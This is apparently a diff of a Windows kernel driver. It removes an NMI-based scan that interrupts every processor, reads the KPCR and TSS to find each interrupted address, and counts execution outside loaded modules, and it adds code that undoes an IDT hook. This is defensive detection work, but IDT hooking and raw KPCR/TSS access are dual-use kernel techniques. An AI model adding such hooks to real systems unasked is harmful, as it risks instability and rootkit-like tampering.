-uint64_t (*ReadKpcrAddress)() = ReadGsBaseHardware;
-
-// Runs in NMI context on the processor that took the NMI, while RunNmiScan has it registered.
-// The CPU pushed its interrupt frame on the NMI stack, whose top is TSS.Ist3, so the frame's RIP is the
-// interrupted address. Returns FALSE, so Windows still gets the NMI.
-uint8_t NmiCallback(void *Context, uint8_t Handled)
-{
-    uint64_t Kpcr = ReadKpcrAddress();
-    TASK_STATE_SEGMENT_64 *Tss = *(TASK_STATE_SEGMENT_64 **) (Kpcr + 0x008);   // the KPCR's pointer to the TSS
-    NMI_FRAME *Frame = (NMI_FRAME *) (Tss->Ist3 - sizeof(NMI_FRAME));
-    RecordArmedNmi(Frame);
-
-    return 0;
-}
-
-// Ends the wait for one processor. If no NMI came, the processor is disarmed, so an NMI that arrives later is ignored,
-// and this returns false. If one was recorded, this waits until the handler has finished writing it, then returns true
-bool CollectNmiRecord(uint32_t Cpu)
-{
-    uint32_t State = NmiArmed;
-    if (__atomic_compare_exchange_n(&NmiState[Cpu], &State, NmiIdle, false, __ATOMIC_SEQ_CST, __ATOMIC_SEQ_CST)) return false;
-    if (State == NmiIdle) return false;
-
-    // The handler is still writing this record. Wait for it, but not forever: a handler that never finishes must not
-    // hang the scan. After the limit, the processor is disarmed and its record is dropped
-    for (uint32_t Spin = 0; Spin < MaxCollectSpins; Spin++)
-    {
-        State = NmiRecorded;
-        if (__atomic_compare_exchange_n(&NmiState[Cpu], &State, NmiIdle, false, __ATOMIC_SEQ_CST, __ATOMIC_SEQ_CST)) return true;
-        __asm__ volatile("pause");
-    }
-
-    __atomic_store_n(&NmiState[Cpu], NmiIdle, __ATOMIC_SEQ_CST);
-    NmiRecords[Cpu].Recorded = false;
-    print(WARN("CPU %u: NMI record did not finish, dropped"), Cpu);
-    return false;
-}
-
-// Sends an NMI to every processor and records what each one interrupted.
-// With HVCI on, the call-stack method records them (a callback registered for the scan). With HVCI off, the IDT
-// handler records them. Call at PASSIVE_LEVEL. Returns how many processors interrupted kernel code outside every
-// loaded module.
-uint32_t RunNmiScan()
-{
-    // IDTHook already decided whether the handler runs. When it does not (HVCI on), the callback records the NMIs
-    bool hvci = !NmiHandlerEnabled;
-    void *handle = nullptr;
-
-    memset(NmiRecords, 0, sizeof(NmiRecords));
-
-    if (hvci)
-    {
-        handle = KeRegisterNmiCallback(NmiCallback, nullptr);
-        if (!handle)
-        {
-            print(ERROR("could not register the NMI callback"));
-            return 0;
-        }
-    }
-
-    // Arm every processor, then send all the NMIs at once. Each processor records only its own NMI, so they do not
-    // interfere, and one wait covers them all
-    uint32_t cores = win::KeQueryActiveProcessorCount(nullptr);
-    if (cores > MaxNmiProcessors) cores = MaxNmiProcessors;
-    int64_t delay = -100 * 10000;   // 100 ms, relative, in 100-nanosecond units
-
-    _KAFFINITY_EX affinity{};
-    KeInitializeAffinityEx(&affinity);
-    for (uint32_t core = 0; core < cores; core++)
-    {
-        KeAddProcessorAffinityEx(&affinity, core);
-        __atomic_store_n(&NmiState[core], NmiArmed, __ATOMIC_SEQ_CST);   // from here, the first NMI on this core is recorded
-    }
-    HalSendNMI(&affinity);
-
-    KeDelayExecutionThread(0, 0, &delay);   // KernelMode, not alertable: let the NMIs finish first
-
-    if (hvci) KeDeregisterNmiCallback(handle);
-
-    // Collect each record once it is complete, then unwind its stack (normal level, so the unwind data can be looked up)
-    for (uint32_t core = 0; core < cores; core++)
-    {
-        if (CollectNmiRecord(core)) WalkNmiStack(&NmiRecords[core]);
-    }
-
-    return CountNmiInterruptsOutsideModules();
+    KeGenericCallDpc((void *) UnhookCpuDpc, nullptr);
+    OriginalNMIHandler = 0;
+    print(INFO("IDTUnHook: original handlers restored"));
 }
